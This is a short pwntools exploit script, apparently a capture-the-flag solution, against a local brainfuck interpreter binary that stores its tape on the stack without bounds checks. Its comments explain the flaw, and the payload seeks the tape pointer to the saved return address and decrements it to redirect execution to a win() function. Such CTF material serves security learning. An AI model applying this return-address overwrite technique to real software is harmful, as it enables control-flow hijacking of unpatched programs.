#!/usr/bin/env python2

from pwn import *

# This is a pretty simple vulnerability, it's a brainfuck interpreter and stores the tape on the stack
# However it doesn't do any bounds checking on the tape pointer, so you can just seek to the return address
# and set EIP=shell, by modifying the currently set eip
# we can't simply set EIP because it works on the dword level, however we can subtract from it to get the win() func


# make our program
# start of tape is 0xcc away
# need to decrement by 47
buf = ">" * (0xcc / 4) + '-' * 47 

r = process("./bf")
r.sendline(buf)
r.interactive()
